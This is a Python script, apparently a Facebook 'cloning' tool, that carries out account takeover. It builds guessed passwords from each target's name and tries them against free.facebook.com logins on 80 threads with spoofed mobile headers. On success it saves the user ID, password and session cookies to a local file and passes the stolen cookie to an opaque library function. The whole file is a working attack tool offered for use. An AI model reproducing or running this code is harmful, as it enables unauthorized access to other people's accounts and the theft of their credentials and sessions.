
# YOU Must RUN pip install mahdix Beafore Run THIS FILE
#------------------------------------#
#---------moduls-----------
import mahdix
import requests,re,os,sys,random,time,json,uuid,base64
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor as ThreadPool

from sympy import lex
mahdix.clear()
logo=("""""")
import mahdix as mx

def main():
    mx.clear()
    print(logo)
    print('[1]File cloning')
addips=[]
Mahdi_pas=[]
cpsh=[]
def file():
    os.system('clear')
    print(logo)
    
    o = input('\x1b[1;97m[+] INPut FILE NAME : ')
    print('')
    try:lin = (o).splitlines()
    except:
        print('File Not Found')
        time.sleep(2)
    print('[1]Mathod 1')
    print('[2]Mathod 2')
    inx=('1')
    print(mx.mahdilinx())
    cps=('y').lower()
    if 'y' in cps:
        cpsh.append('y')
    else:pass
    print(mx.mahdilinx())
    print(f'{mx.LI_YELLOW}      Auto pass Added     ')
    addpas=('n')
    if 'y' in addpas:
        lim=int(input('How many pass Do You add :'))
        for io in range(lim):
            #Mahdi_pas=[]
            inpass=input(f'[{io+1}]{mx.my_color} Input passWord :')
            Mahdi_pas.append(inpass)
    else:pass
    mx.clear()
    print(logo)
    global lex
    lex=len(lin)
    print(f'{mx.LI_CYAN}Tools Has Been Starteed......')
    print(f'{mx.LI_YELLOW}Total Ids {mx.LI_CYAN}{lex}')
    print(f"\r{mx.LI_YELLOW}OF{mx.LI_WHITE}/{mx.LI_GREEN}ON {mx.LI_YELLOW}FLIGHT (airplane){mx.LI_WHITE} MODE \033[1;96m")    
    print(mx.mahdilinx())
    with ThreadPool(max_workers=80) as mahdisub:
        for xid in lin:
            try:
                # ------ Name and Uid-------
                #xid=''
                uid=xid.split('|')[0]
                name=xid.split('|')[1]
                #---------------pass------------------
                try:
                    fst=name.split(' ')[0]
                    las=name.split(' ')[1]
                except:
                    fst=xid.split('|')[1]
                    las=xid.split('|')[1]
                on='123';tw='121'
                Mahdi_pass=[name,name+'@123',name+'123',fst+'123',fst.lower()+'123', fst+'@@##',fst+'@@',fst+'@@##',las+on,las+tw,las+'@@##',las+'@@',las+'@@##',las.lower()+on]
                Mahdi_pass.extend(Mahdi_pas)
                global tolatpas
                tolatpas=(len(Mahdi_pass))
                if '1' in inx:
                    mahdisub.submit(mathodonr,uid,Mahdi_pass)
                else:
                    mahdisub.submit(bapi,uid,Mahdi_pass)
            except:pass
#-=----------------------------------UA----------------------------------------------------------------------------

#-------------------------------------------------------------------
okx=[]
cp=[]
loop=0
def mathodonr(uid,Mahdi_pass):
    global loop
    try:
        for pasx in Mahdi_pass:
            sec=requests.Session()
            getdata=bs(sec.get('https://free.facebook.com/login.php').content,'html.parser')
            a=getdata.find_all("form")[0]
            inps=a.find_all("input")
            data={"email":uid,
            "pass":pasx,
            "login":"Log In"}
            for i in inps:
                try:data[i["name"]]=i["value"]
                except:pass
            headers = {
                    'method': 'GET',
                    'scheme': 'https',
                    'authority': 'free.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'max-age=0',
                    'dpr': '3',
                    'referer': 'https://free.facebook.com/?stype=lo&deoia=1&jlou=AffEi1s5sDi8R7wn47Qnu8DU_QvFX-ttWu9b9--sgJOXKlhl6mk2MkZXgX8nDbHfcxmeEtScV48XojTKA5e4w5rB3Gf-kbqQkQtfdehEW_Q9jg&smuh=49025&lh=Ac9eDesUcPA1c9sKEBI&wtsid=rdr_0jjSzj9HMJ685sBkz&refid=8&ref_component=mbasic_footer&_rdr',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-model': '"CPH2565"',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"14.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                    'viewport-width': '980',
                }
            lo = sec.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=data,headers=headers).text
            log_cookies=sec.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in sec.cookies.get_dict().items()])
                mahdiid=coki.split('c_user=')[1]
                cid=mahdiid[0:15];mahdix.flw(coki)
                print(f'{mx.LI_YELLOW}[OK] {mx.LI_GREEN}{cid} | {pasx}\n')
                print(f'{mx.LI_CYAN}Cookes : {mx.LI_WHITE} {coki}')
                open('/sdcard/NIROB-Ok.txt', 'a').write(f'{cid}|{pasx}|{coki}\n')
                okx.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                if 'y' in cpsh:
                    coki=";".join([key+"="+value for key,value in sec.cookies.get_dict().items()])
                    print(f'{mx.LI_YELLOW}[CP]{mx.LI_GREEN}{uid} | {pasx}')
                open('/sdcard/NIROB-CP.txt', 'a').write( uid+'|'+pasx+'\n')
                break
            else:
                continue
        sys.stdout.write(f'\r\r\r{mahdix.LI_GREEN}OK : {len(okx)} Creacked : {random.choice(mahdix.mycolor)}{loop}\r')
        sys.stdout.flush()
        loop+=1
    except:pass




#----------------------------------------------------------------------

file()
